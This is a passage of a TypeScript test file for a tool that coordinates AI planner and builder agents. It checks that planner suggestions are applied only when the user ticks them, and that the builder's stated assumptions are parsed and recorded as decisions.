  it('asks the planner, then applies only what you tick, saying what happened', async () => {
    const { store, project, tasks } = board();
    store.projects.updateTask(tasks[1]!.id, { status: 'building' });
    const planner = new FakeAdapter(
      {
        reply: JSON.stringify({
          reply: 'I’d drop the combo counter and make the buttons bigger.',
          actions: [
            { type: 'skip_task', id: tasks[0]!.id },
            { type: 'skip_task', id: tasks[1]!.id },
            { type: 'add_task', title: 'Bigger buttons', spec: '48px buttons', after: [] },
            { type: 'decision', question: 'Combo counter?', answer: 'Drop it' },
            { type: 'pause' },
          ],
        }),
      },
      { id: 'claude' },
    );
    const ctx = { store, adapters: adapterMap([planner]), cwd: tmpdir() };
    const { you, planner: reply } = await steer(
      ctx,
      project,
      tmpdir(),
      'drop the combo counter, bigger buttons',
    );
    expect(you.text).toBe('drop the combo counter, bigger buttons');
    expect(reply.actions).toHaveLength(5);
    expect(planner.requests[0]).toMatchObject({ role: 'planner', readOnly: true });
    expect(planner.requests[0]!.prompt).toContain(`- ${tasks[1]!.id} [building] Two`);

    const applied = applySteering(ctx, reply.id, [0, 1, 2, 3]);
    expect(applied.applied).toEqual([0, 1, 2, 3]);
    expect(applied.outcome).toEqual([
      'Skipped “One”',
      'Not done: Only failed, queued or waiting tasks can be skipped (this one is building).',
      'Added “Bigger buttons”',
      'Decision: Drop it',
    ]);
    expect(store.decisions.list(project.id).map((d) => d.answer)).toEqual(['Drop it']);
    // Not ticked: still running.
    expect(store.projects.get(project.id)!.status).not.toBe('paused');
    expect(() => applySteering(ctx, reply.id, [4])).toThrow(/already applied/);
    expect(store.steering.list(project.id).map((m) => m.role)).toEqual(['you', 'planner']);
  });
});

describe('Decide and tell', () => {
  it('parses ASSUMED lines from a builder summary', () => {
    expect(
      parseAssumptions(
        'Created calc.js.\n\nASSUMED: Which cutoff for large numbers? → 1e12, as in the examples\n- ASSUMED: Tabs or spaces -> spaces\nnot an ASSUMED line',
      ),
    ).toEqual([
      { question: 'Which cutoff for large numbers?', answer: '1e12, as in the examples' },
      { question: 'Tabs or spaces', answer: 'spaces' },
    ]);
  });

  it('lets the builder decide as it goes and records each choice, in one build', async () => {
    const { store, brain, project, codex } = await setup({
      askPolicy: 'decide',
      codex: {
        reply: 'Created sum.js\nASSUMED: Should sum accept strings? → No, numbers only',
        act: writeSum('a + b'),
      },
    });
    expect((await brain.run({ maxRounds: 10 })).kind).toBe('done');
    expect(codex.requests).toHaveLength(1);
    expect(codex.requests[0]!.prompt).toContain('ASSUMED: <the question> → <what you chose>');
    expect(store.decisions.list(project.id)).toEqual([
      expect.objectContaining({
        kind: 'assumption',
        question: 'Should sum accept strings?',
        answer: 'No, numbers only',
        provider: 'codex',
      }),
    ]);
  });

  it('keeps the ask-me rule when you want to be asked', async () => {
    const { brain, codex } = await setup();
    await brain.run({ maxRounds: 10 });
    expect(codex.requests[0]!.prompt).not.toContain('ASSUMED:');
    expect(codex.requests[0]!.prompt).toContain('{"question": "...", "why": "...", "options"');
  });
});
